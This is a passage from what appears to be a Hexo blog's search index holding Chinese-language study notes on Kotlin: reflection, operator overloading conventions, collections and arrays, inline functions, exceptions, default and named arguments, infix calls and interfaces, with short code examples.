<li><p>KFunction<br>它接受一个方法的反射，然后它提供了一个方法<code>call()</code>可以用来调用这个方法，而且<code>call()</code>的参数是可变参数，无论你的方法有几个参数他都能够实现。但是这种方法不安全，它可能会导致类型不安全，或者参数数量不对等错误。<br>因此kotlin提供了另一种方法，<code>invoke()</code>它会根据你的方法参数数量和类型而确定自己的参数。当然它需要KFunction1,KFunction2等等这些类型。这些类型被称为合成的编译器生成类型，它不会在包内声明。这意味着你可以使用任意数量的参数，而且它减小了jar包的尺寸。</p>
<blockquote>
<p>KFunction和Function有着类似的属性。当然他们也都可以接受lambda函数和::函数的函数体。</p>
</blockquote>
</li>
<li><p>KProperty<br>首先，它必须接受一个属性，而不是普通的变量。<br>其次你使用它获取属性就是通过::来获取的，也可以类似于lambda函数。因此你使用这个属性时，必须得传入一个实例进去，或者绑定引用。如果是全局的，就不需要特定的传入一个实例。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin(运算符重载和其他约定）</title>
    <url>/posts/65b01aec/</url>
    <content><![CDATA[<blockquote>
<p>在java中，有一些特定的类与语言特性相关联，例如使用了iterable接口的对象可以在for循环中使用。</p>
</blockquote>
<p>而在kotlin中，也有很多与语言特性相关的函数命名，对，他与java并不一样，他是选择了将功能和函数命名来绑定。<br>例如，如果在你的类中定义了一个名为 plus 的特殊方法，那么按照约定，就可以在该类的实例上使用<code>+</code>运算符。因此，在 Kotlin 中，我们把这种技术称为<strong>约定</strong></p>
<h2 id="约定"><a href="#约定" class="headerlink" title="约定"></a>约定</h2><p>因为他并不是强依赖于类和他的继承关系。在kotlin中使用约定可以在类中重载其方法，也可以通过扩展函数去添加约定，从而适应现有的java类而不用修改其代码。</p>
<h3 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h3><p>运算符重载所需要的关键词是<code>operator</code>，而且他所重载的方法都有特定的命名，都必须带上operator关键字。<br><strong><em>这些表达式同样也满足+-</em>&#x2F;的基本运算规则。</strong>*</p>
<table>
<thead>
<tr>
<th align="center">表达式</th>
<th align="center">函数名</th>
</tr>
</thead>
<tbody><tr>
<td align="center">a * b</td>
<td align="center">times</td>
</tr>
<tr>
<td align="center">a + b</td>
<td align="center">plus</td>
</tr>
<tr>
<td align="center">a - b</td>
<td align="center">minus</td>
</tr>
<tr>
<td align="center">a &#x2F; b</td>
<td align="center">div</td>
</tr>
<tr>
<td align="center">a % b</td>
<td align="center">mod</td>
</tr>
<tr>
<td align="center">a * &#x3D; b</td>
<td align="center">timesAssign</td>
</tr>
<tr>
<td align="center">a + &#x3D; b</td>
<td align="center">plusAssign</td>
</tr>
<tr>
<td align="center">a % &#x3D; b</td>
<td align="center">modAssign</td>
</tr>
<tr>
<td align="center">a &#x2F; &#x3D; b</td>
<td align="center">divAssign</td>
</tr>
<tr>
<td align="center">a - &#x3D; b</td>
<td align="center">minusAssign</td>
</tr>
<tr>
<td align="center">+ a</td>
<td align="center">unaryplus</td>
</tr>
<tr>
<td align="center">- a</td>
<td align="center">unaryminus</td>
</tr>
<tr>
<td align="center">! a</td>
<td align="center">not</td>
</tr>
<tr>
<td align="center">a++,++a</td>
<td align="center">inc</td>
</tr>
<tr>
<td align="center">a–,–a</td>
<td align="center">dec</td>
</tr>
</tbody></table>
<blockquote>
<p>如果从java中调用kotlin，那么可以很轻松的调用，因为每个重载的运算符都被定义为一个函数，可以像普通函数一样去调用。如果从kotlin调用java。java是不支持operator关键词的，只能写普通的函数，或者使用扩展函数来实现。</p>
</blockquote>
<h4 id="二元运算符"><a href="#二元运算符" class="headerlink" title="二元运算符"></a>二元运算符</h4><p><em>*<em>kotlin中的这些运算符重载是不支持交换性的，也就是p</em>1.5和1.5*p是两个东西，p</em>1.5是在p的类中，定义了一个times方法，接受double参数。而1.5<em>p就是在Double类中定义了一个times方法接受p类的参数。</em>**</p>
<p>简单点说，就是他的顺序有限制，一般是前一个参数是本类，用来实现调用方法，后一个参数是接受的参数。</p>
<h4 id="复合运算符"><a href="#复合运算符" class="headerlink" title="复合运算符"></a>复合运算符</h4><p>当你的代码中出现+&#x3D;时，一般会plus和plusAssign都可以响应，编译器有可能报错。<br>通常情况下的解决办法是，plus都会返回一个新创建的类，所以一般用val去定义变量，直接用新地址去接受一个新变量。而plusAssign最好使用var，或者数组中相关的改变方法，这样才可以修改地址。<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD%E5%92%8C%E5%85%B6%E4%BB%96%E7%BA%A6%E5%AE%9A%EF%BC%89-2023-07-21-13-00.png"><br>在某些时候，这两个都是可以同时调用的，因此建议只用一个</p>
<h4 id="一元运算符"><a href="#一元运算符" class="headerlink" title="一元运算符"></a>一元运算符</h4><p>对于一元运算符，通常都是直接改变原值。而且对于他的++a,a++。kotlin库中也满足对应的顺序关系。</p>
<h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p><code>equals</code>和<code>===</code>和<code>==</code>的关系：<br>在kotlin中的equals就是比较值的关系，他与&#x3D;&#x3D;是等价的。也就是重写了equals方法就可以调用&#x3D;&#x3D;这个运算规则。<br>而<code>===</code>则是比较引用地址是否相同。</p>
<blockquote>
<p>equals同样也是与&#x3D;&#x3D;规则一致的，但是他并不需要写operator关键词，只需要写override？</p>
</blockquote>
<p>因为equals这个方法是定义在Any类上，也就是所有的类都继承了equals方法，而他的operator关键词在Any中就定义了，所以我们不需要在写这个关键词，只需要添加上override表示重写即可。<br>还要注意，equals 不能实现为扩展函数，因为继承自 Any类的实现始终优先于扩展函数。</p>
<h3 id="排序运算符"><a href="#排序运算符" class="headerlink" title="排序运算符"></a>排序运算符</h3><p><img src="https://image.zfxt.top/hexo-blog/kotlin(%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD%E5%92%8C%E5%85%B6%E4%BB%96%E7%BA%A6%E5%AE%9A%EF%BC%89-2023-07-09-14-10.png"><br>直接使用比较符号运算都会调用compareTo方法。</p>
<p>在Java 中，类可以实现 Comparable 接口，以便在比较的算法中使用，例如在查找最大值或排序的时候。接口中定义的compareTo方法用于确定一个对象是否大于另一个对象 但是在 Java 中，这个方法的调用没有简明语法。只有基本数据类型能使用 来比较，所有其他类型都需要明确写为elementl compare To(element2）<br>Kotlin 支持相同的 Comparable 接口。但是接口中定义的compare To 方法可以按约定调用，比较运算符（＜，＞，＜＝和＞＝） 的使用将被转换为 compareTo。</p>
<p>如果kotlin中实现了compareble接口，那么就可以直接重写compareTo而不使用operator关键字。</p>
<p><code>CompareValueBy</code>是kotlin标准库中简洁的实现compareTo方法。。这个函数接收用来计算比较值的一系列回调，按顺序依次调用回调方法，两两一组分别做比较，并返回结果。而且这些回调可以使用lambda函数,如：<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD%E5%92%8C%E5%85%B6%E4%BB%96%E7%BA%A6%E5%AE%9A%EF%BC%89-2023-07-21-54-50.png"></p>
<h2 id="集合和区间的约定"><a href="#集合和区间的约定" class="headerlink" title="集合和区间的约定"></a>集合和区间的约定</h2><ol>
<li>通过集合下标访问元素<br>他的本质就是调用了set和get方法。可以自己重写这些方法。而且你get，set方法可以与往常不一样，你还可以多设置几个参数，例如在二维数组的使用。operator fun get (rowindex: Int, colindex: Int ），然后用matrix [row,col ］来调用具体的值。<br>set也是同理，只需要在相对应的get方法后，在多加一个value的参数即可。set 的最后一个参数用来接收赋值语句中（等号）右边的值，其他参数作为方括号内的下标<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD%E5%92%8C%E5%85%B6%E4%BB%96%E7%BA%A6%E5%AE%9A%EF%BC%89-2023-07-13-43-48.png"></li>
</ol>
<h3 id="in的约定"><a href="#in的约定" class="headerlink" title="in的约定"></a>in的约定</h3><p>当坚持一个对象是否属于某个集合时，或者类是否有继承关系时，就可以用in，他与<code>contains</code>方法相关联。返回一个Boolean值。</p>
<h3 id="rangeTo-的约定"><a href="#rangeTo-的约定" class="headerlink" title="rangeTo 的约定"></a>rangeTo 的约定</h3><p><img src="https://image.zfxt.top/hexo-blog/kotlin(%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD%E5%92%8C%E5%85%B6%E4%BB%96%E7%BA%A6%E5%AE%9A%EF%BC%89-2023-07-15-56-44.png"><br>..会转化为rangeTo的函数。<br>如果<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD%E5%92%8C%E5%85%B6%E4%BB%96%E7%BA%A6%E5%AE%9A%EF%BC%89-2023-07-00-05-18.png"></p>
<h3 id="for循环中使用iterator的约定"><a href="#for循环中使用iterator的约定" class="headerlink" title="for循环中使用iterator的约定"></a>for循环中使用iterator的约定</h3><p>如果是在for循环中，那么他使用的in运算符他就不是调用contains方法，而是调用iterator方法，他会自动的使用hasNext和Next方法。形成iterator的迭代。</p>
<h2 id="解构声明和组件函数和循环"><a href="#解构声明和组件函数和循环" class="headerlink" title="解构声明和组件函数和循环"></a>解构声明和组件函数和循环</h2><p><img src="https://image.zfxt.top/hexo-blog/kotlin(%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD%E5%92%8C%E5%85%B6%E4%BB%96%E7%BA%A6%E5%AE%9A%EF%BC%89-2023-07-06-45-39.png"><br>他的关键就是允许你在一个函数中需要返回多个值时，可以用一个对象把他们存起来，然后获得对象后，用结构声明把这个对象的属性分别导出来。<strong>而且他最多支持一个对象里最多五个属性</strong>再多的他也无法导出来。</p>
<p>在循环中的使用就是例如可以把map中的key和value同时导出来。for((key,value) in map)。这样的就会很便利。<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD%E5%92%8C%E5%85%B6%E4%BB%96%E7%BA%A6%E5%AE%9A%EF%BC%89-2023-07-13-03-14.png"></p>
<h2 id="委托属性：重用属性访问的逻辑"><a href="#委托属性：重用属性访问的逻辑" class="headerlink" title="委托属性：重用属性访问的逻辑"></a>委托属性：重用属性访问的逻辑</h2><p>这个功能的基础是委托，他是一种设计模式。操作的对象不用执行，而是把工作委托给另一个辅助的对象。<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD%E5%92%8C%E5%85%B6%E4%BB%96%E7%BA%A6%E5%AE%9A%EF%BC%89-2023-07-15-57-55.png"><br>我们通过在另一个委托类中，定义getValue和setValue方法来实现把一个属性的get和set方法都交给另个一类实现。<br>他有几个使用场景：</p>
<ol>
<li><p>惰性初始化<br>当我们初始化一个类时，如果直接把他所有的属性初始化完，会占用很大的内存。所以我们惰性初始化，只有当我们调用了get方法时，才会去完成初始化。<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD%E5%92%8C%E5%85%B6%E4%BB%96%E7%BA%A6%E5%AE%9A%EF%BC%89-2023-07-07-53-59.png"></p>
</li>
<li><p>将逻辑都放到另一个类中统一处理。<br>例如设置一个日志功能，使用set修改内容后，会打印修改内容。<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD%E5%92%8C%E5%85%B6%E4%BB%96%E7%BA%A6%E5%AE%9A%EF%BC%89-2023-07-22-13-23.png"><br>kotlin标准库中实现了一个类似的功能的类，你直接调用即可，而不用通过java去写他的具体实现。<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD%E5%92%8C%E5%85%B6%E4%BB%96%E7%BA%A6%E5%AE%9A%EF%BC%89-2023-07-03-07-33.png"></p>
</li>
<li><p>实现细节<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD%E5%92%8C%E5%85%B6%E4%BB%96%E7%BA%A6%E5%AE%9A%EF%BC%89-2023-07-05-38-22.png"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin(集合和数组）</title>
    <url>/posts/f45b89dd/</url>
    <content><![CDATA[<h2 id="持有可空类型元素和持有非空类型元素的集合"><a href="#持有可空类型元素和持有非空类型元素的集合" class="headerlink" title="持有可空类型元素和持有非空类型元素的集合"></a>持有可空类型元素和持有非空类型元素的集合</h2><p>变量自己类型的可空性和用作类型参数 类型 的可空性是有区别的<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E9%9B%86%E5%90%88%E5%92%8C%E6%95%B0%E7%BB%84%EF%BC%89-2023-07-19-04-16.png"><br>集合中是允许可空值的。</p>
<h2 id="只读集合和可变集合"><a href="#只读集合和可变集合" class="headerlink" title="只读集合和可变集合"></a>只读集合和可变集合</h2><p>kotlin将访问集合的接口和访问数据的接口分开了。<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E9%9B%86%E5%90%88%E5%92%8C%E6%95%B0%E7%BB%84%EF%BC%89-2023-07-05-50-59.png"><br>可变集合继承自只读集合，只读集合不可修改，可变集合在只读集合的基础上增加了添加，移除元素，清空集合等方法。</p>
<p>一般的规则是，在代码中都应该使用只读集合。只有在需要修改的地方才使用可变接口的变体。这在函数中接受参数时也更明确了什么什么集合是可修改的，什么时候只适用于读取。<br><strong>只读集合不能传递给可变集合，但是可变集合可以传递给只读集合</strong></p>
<p><img src="https://image.zfxt.top/hexo-blog/kotlin(%E9%9B%86%E5%90%88%E5%92%8C%E6%95%B0%E7%BB%84%EF%BC%89-2023-07-04-14-09.png"><br>所以只读集合也并不总是线程安全的，在多线程环境下处理数据，需要保证代码的正确同步关系。</p>
<h2 id="kotlin集合和java"><a href="#kotlin集合和java" class="headerlink" title="kotlin集合和java"></a>kotlin集合和java</h2><p>每一个kotlin接口都是对应java集合接口的一个实例。在kotlin和java之间转移并不需要转化：<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E9%9B%86%E5%90%88%E5%92%8C%E6%95%B0%E7%BB%84%EF%BC%89-2023-07-17-45-08.png"><br>map也并没有继承自Collection和Iterable<br>他也被表示为两种类型：只读和可变<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E9%9B%86%E5%90%88%E5%92%8C%E6%95%B0%E7%BB%84%EF%BC%89-2023-07-20-44-37.png"></p>
<h3 id="java操作kotlin集合"><a href="#java操作kotlin集合" class="headerlink" title="java操作kotlin集合"></a>java操作kotlin集合</h3><p><strong>因为java不会区分可变和只读集合，所以从java调用kotliln的集合时，kotlin编译器不会拒绝java代码对集合做了什么，即便对只读集合进行了修改。</strong><br>对于非空类型也需要注意，在kotlin中声明了是非空类型，但是在java中仍然有可能会添加空值进去，所以需要对他进行单独的处理。</p>
<h3 id="kotlin操作java集合"><a href="#kotlin操作java集合" class="headerlink" title="kotlin操作java集合"></a>kotlin操作java集合</h3><p>需要根据实际情况给他添加上适当的约束，如是否可空，可变等。</p>
<h2 id="对象和基本数据类型的数组"><a href="#对象和基本数据类型的数组" class="headerlink" title="对象和基本数据类型的数组"></a>对象和基本数据类型的数组</h2><p><img src="https://image.zfxt.top/hexo-blog/kotlin(%E9%9B%86%E5%90%88%E5%92%8C%E6%95%B0%E7%BB%84%EF%BC%89-2023-07-12-13-21.png"></p>
<p>kotlin最常用的创建数组的情况之一是需要调用参数为数组的java方法。或是带有vararg参数的kotlin函数。通常情况下，数据已经存储在集合中，只需将其转化为数组即可。可以使用<code>toTypeArray</code>方法把他转为数组。然后数组可以通过<code>*</code>对他进行展开。转变为vararg的参数。<br><strong>数组类型的类型参数始终会变成对象类型</strong><br>因为大部分创建数组或者集合时，都是使用的泛型类，对于泛型，必然是对象类型进行存储。而在kotlin中，他提供了一些单独的类，用来专门存储基础数据类型的数组，如IntArray，ByteArray，BooleanArray等。这些都可以编译为java中的基本类型数组byte[],int[]等<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E9%9B%86%E5%90%88%E5%92%8C%E6%95%B0%E7%BB%84%EF%BC%89-2023-07-19-02-31.png"></p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin(内联函数)(高阶函数控制)</title>
    <url>/posts/15d97abc/</url>
    <content><![CDATA[<h2 id="内联函数"><a href="#内联函数" class="headerlink" title="内联函数"></a>内联函数</h2><p>首先，一般情况下。lambda 表达式会被正常地编译成匿名类。这表示每调用一次lambda 表达式，一个额外的类就会被创建。并且如果 lambda 捕捉了某个变量，那么每次调用的时候都会创建一个新的对象 这会带来运行时的额外开销，导致使lambda 比使用一个直接执行相同代码的函数效率更低。</p>
<p>而内联函数可以解决这个效率低下的问题，也就是使用inline关键字，他在编译后，不会是一个调用函数的代码，而是直接把函数体复制并替换到当前位置，然后直接执行。</p>
<h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><p>一般情况下都可以使用，但是最推荐，当你使用lambda函数时，因为这样子可以最大的提高效率。<br>而如果你使用的lambda函数已经被定义到某个具体的类中时，或者被作为一个参数接收起来。<br>总而言之就是必须要现场写的lambda函数。他的使用才有意义。不然他将不会被内联进来，只会编译为调用函数的过程。</p>
<h3 id="JVM自动内联"><a href="#JVM自动内联" class="headerlink" title="JVM自动内联"></a>JVM自动内联</h3><p>对于普通的函数调用，JVM己经提供了强大的内联支持。它会分析代码的执行，并在任何通过内联能够带来好处的时候将函数调用内联。这是在将宇节码转换成机器代码时自动完成的。在字节码中，每一个函数的实现只会出现一次，并不需要跟Kotlin 的内联函数一样，每个调用的地方都拷贝一次。再说，如果函数被直接调用，调用只会更加清晰。</p>
<p>但是如果内联的代码太大也会很难看。</p>
<h2 id="高阶函数控制"><a href="#高阶函数控制" class="headerlink" title="高阶函数控制"></a>高阶函数控制</h2><p>如果我们使用lambda如forEach的函数时，就会很快遇到关于return的问题。因为他的return会直接从最外层的函数返回。</p>
<ol>
<li><p>如果你在lambda函数中使用return，那么他默认会从调用lambda函数的函数中返回。并不只是从lambda函数返回。这个被称为非局部返回。</p>
<blockquote>
<p>需要注意的是，只有在以 lambda 作为参数的函数是内联函数的时候才能从外层的函数返回。</p>
</blockquote>
</li>
<li><p>如果我们要从lambda函数中局部返回，可以使用标签，或者从函数名返回。(类似于continue的实现)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1 函数名</span></span><br><span class="line"><span class="string">&quot;123141&quot;</span>.forEach &#123;</span><br><span class="line">            <span class="keyword">if</span> (it == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span><span class="meta">@forEach</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//2 标签</span></span><br><span class="line"><span class="string">&quot;123141&quot;</span>.forEach lable@&#123;</span><br><span class="line">        <span class="keyword">if</span> (it == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span><span class="meta">@lable</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><strong>一个 lambda 表达式的标签数量不能多于一个。</strong>也就是使用了标签，函数名就无法使用了。<br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E5%86%85%E8%81%94%E5%87%BD%E6%95%B0)(%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6)-2023-07-17-23-09.png"><br><img src="https://image.zfxt.top/hexo-blog/kotlin(%E5%86%85%E8%81%94%E5%87%BD%E6%95%B0)(%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6)-2023-07-22-01-56.png"></p>
</li>
<li><p>匿名函数默认从lambda函数返回，也就是和普通的非内联lambda一致。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin异常</title>
    <url>/posts/2280ab3c/</url>
    <content><![CDATA[<p>在kotlin中，他解决异常的方式与java类似，有两种共解决办法。</p>
<ol>
<li>throw<br>可以选择用<code>throw</code>来抛出异常。但是不一样的是，在kotlin中，他的throw是一个表达式，也就是throw可以作为一个值让其他的表达式使用。</li>
<li>try-cacth</li>
</ol>
<ul>
<li>可以像java一样使用try-catch</li>
<li>在kotlin中，try-catch也是表达式的形式。例如：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">val</span> <span class="variable">number</span> <span class="operator">=</span> <span class="keyword">try</span>&#123;</span><br><span class="line">	Integer.parseInt(reader.readLine())</span><br><span class="line">&#125;<span class="keyword">catch</span>(e:NumberFormatException)&#123;</span><br><span class="line">	<span class="literal">null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
他会返回最后代码块中的最后一个表达式。<br><em><strong>而kotlin与java异常不同之处</strong></em><br>在java中有两种异常，受检异常和未受检异常。java必须显示的处理受检异常，例如<code>IOException</code>，而kotlin中，不区分受检异常和非受检异常。你不需要用throws来强制的抛出异常。</li>
</ul>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin函数特点</title>
    <url>/posts/29d73382/</url>
    <content><![CDATA[<h2 id="kotlin中的集合"><a href="#kotlin中的集合" class="headerlink" title="kotlin中的集合"></a>kotlin中的集合</h2><p>在kotlin中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">main</span><span class="params">(args: Array&lt;String&gt;)</span> &#123;</span><br><span class="line">    println(set.javaClass)</span><br><span class="line">    println(list.javaClass)</span><br><span class="line">    println(map.javaClass)</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">val</span> <span class="variable">set</span> <span class="operator">=</span> setOf(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="type">val</span> <span class="variable">list</span> <span class="operator">=</span> arrayListOf(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="type">val</span> <span class="variable">map</span> <span class="operator">=</span> mapOf(<span class="number">1</span> to <span class="string">&#x27;a&#x27;</span>,<span class="number">2</span> to <span class="string">&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>他的输出结果为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">class java.util.LinkedHashSet</span><br><span class="line">class java.util.ArrayList</span><br><span class="line">class java.util.LinkedHashMap</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure>
<p>也就是说明，在kotlin中，他并没有单独的集合类，而是采用了java的集合类。但是他相对于java的集合类又有一些特殊的方法，如<code>last()</code>,<code>max()</code>之类。</p>
<h2 id="函数的相关细节"><a href="#函数的相关细节" class="headerlink" title="函数的相关细节"></a>函数的相关细节</h2><ol>
<li><p>显示标明参数<br>在kotlin中，kotlin可以直接显式的标明一些参数的名称，而不一定要通过顺序或者查看文档来获取应该如何填写参数。<br><em><strong>不过，如果使用了显示的标明参数，那么他之后的参数也必须都标明。</strong></em></p>
</li>
<li><p>默认参数值<br>在kotlin中有一个特别好用的技巧就是默认参数值，通过这个默认参数值，可以省略掉很多java中必须重载的方法（这些方法只是因为参数的类型和数量不同）。使用了默认参数值后便不需要使用这些重构。任何你没有填写的参数他都会直接用默认参数来代替。</p>
<blockquote>
<p>考虑到java有与kotlin的互操型，如果java调用kotlin的函数，由于java没有默认参数的说法，所以可以在kotlin的方法上加上注解<code>@JvmOverloads</code>，然后编译器会自动生成所有重载方法，从最后一个省略每个参数</p>
</blockquote>
</li>
<li><p>顶层函数<br>在kotlin中，他可以直接有全局的函数和变量，这些函数和变量在经过编译器编译过后，会自动转化成<code>public static</code>的方法和<code>public static final</code>的属性，他所存在的类就是kt的文件名到时候会在编译时转化成类。<br>此时这些函数都会转化为静态方法或者静态变量。如果下需要自定义类名，可以在这个文件最顶部加上注解<code>@JvmName(&quot;你需要制定的类名“)</code><br>然后在java中调用这些静态方法就可以使用类名.方法的方式来调用了</p>
</li>
</ol>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin处理集合：可变参数，中缀调用</title>
    <url>/posts/a1ba9580/</url>
    <content><![CDATA[<ol>
<li><p>可变参数<br>在kotlin中创建一个集合，可以往其中传递任意数量的参数进去。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun listOf&lt;T&gt;(vararg values:T):List&lt;T&gt;&#123;...&#125;</span><br></pre></td></tr></table></figure>
<p>在kotlin中，是直接使用vararg来说修饰可变参数的。<br>而且kotlin和java的另一个区别就是java中，你可以按照原样传递某个数组进去，而kotlin需要你显式的对这个数组进行解包操作。例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">val</span> <span class="variable">list1</span> <span class="operator">=</span> listOf(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"><span class="type">val</span> <span class="variable">list2</span> <span class="operator">=</span> listOf(*list1,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"><span class="comment">//最后list2的结果为[&quot;1&quot;,&quot;2&quot;,&quot;3&quot;]</span></span><br></pre></td></tr></table></figure>
<p>这个功能被称为<strong>展开运算符</strong></p>
</li>
<li><p>中缀调用和解构声明<br>在kotlin中，创建一个map</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">val</span> <span class="variable">map</span> <span class="operator">=</span> mapOf(<span class="number">1</span> to <span class="string">&quot;One&quot;</span>,<span class="number">2</span> to <span class="string">&quot;Two&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>这里的<code>to</code>就是不是一直欧冠你内置的结构，而是一种特殊的函数调用，被称为中缀调用。<br>在kotlin中他有一个有与java不同的类，<code>Pair</code>，他用来表示一对元素而且他和to都用到了泛型。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>to(<span class="string">&quot;one&quot;</span>)<span class="comment">//一般to函数的调用</span></span><br><span class="line"><span class="number">1</span> to <span class="string">&quot;one&quot;</span><span class="comment">//使用中缀符号调用to函数</span></span><br></pre></td></tr></table></figure>
<p>如果需要使用中缀符号，那么需要使用<code>infix</code>修饰符来标记</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">infix fun Any.to(other:Any) = Pair(<span class="built_in">this</span>,other)</span><br></pre></td></tr></table></figure>
<p>而解构声明就是把把Pair展开，用来初始化两个变量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">val (number,name) = <span class="number">1</span> to <span class="string">&quot;one&quot;</span></span><br></pre></td></tr></table></figure>
<p>同样的，对于使用withIndex的数列也一样可行<br>如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>((index,element) in collection.withIndex())&#123;</span><br><span class="line">			...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>字符分割和正则表达式<br>相比与java中的split分割方法，kotlin对他进行了重写，使他更为直观。</p>
<ul>
<li>可以直接通过任意数量的纯文本字符串进行分割，也就是直接调用split方法</li>
<li>采用正则表达式进行分割，kotlin在这引入了一个新类型，<code>Regex</code>，他可以将字符串转化为正则表达式，然后在split()函数中传入这个Regex，例如：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">println(<span class="string">&quot;12.346-A&quot;</span>.split(<span class="string">&quot;\\.|-&quot;</span>.toRegex()))</span><br><span class="line"><span class="comment">//输出结果为[12,346,A]</span></span><br></pre></td></tr></table></figure>
 \.是用来转义的，因为.在正则中表示，任意的字面量</li>
</ul>
</li>
<li><p>局部函数<br>他的简单理解就是在函数中，将重复的代码提取成一个函数内的函数，化简代码。<br>而且这个局部函数也可以扩展到外面。<br><strong>做了扩展的局部函数保证了，即便是同一个类，只有在某些时候，才能使用他的方法，比如验证过程，日志过程，就不需要该类在任意时刻都被用到</strong></p>
</li>
</ol>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin接口和控制继承，可见修饰符</title>
    <url>/posts/26344689/</url>
    <content><![CDATA[<h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>在kotlin中，也是使用interface来定义接口的。<br>接口中，可以定义属性和方法，方法可以实现，也可以不实现。但是他们都是默认为open的，也就是可以被继承和重写的。</p>
<ul>
<li>属性不能赋值，而且实现了这个接口的方法必须重写该属性，添加上get，set方法</li>
<li>未实现的方法在被之后的类实现时，必须把这个方法也同时实现了。</li>
<li>实现的方法（即带方法体的方法）可以不重写，而是直接使用。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    B().showA()</span><br><span class="line">    B().showB()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    val sb:String</span><br><span class="line">    fun <span class="title function_">showA</span><span class="params">()</span>&#123;</span><br><span class="line">        println(<span class="number">123</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    fun <span class="title function_">showB</span><span class="params">()</span>&#123;</span><br><span class="line">        println(<span class="string">&quot;234&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(): A &#123;</span><br><span class="line">    override val sb: String</span><br><span class="line">        <span class="title 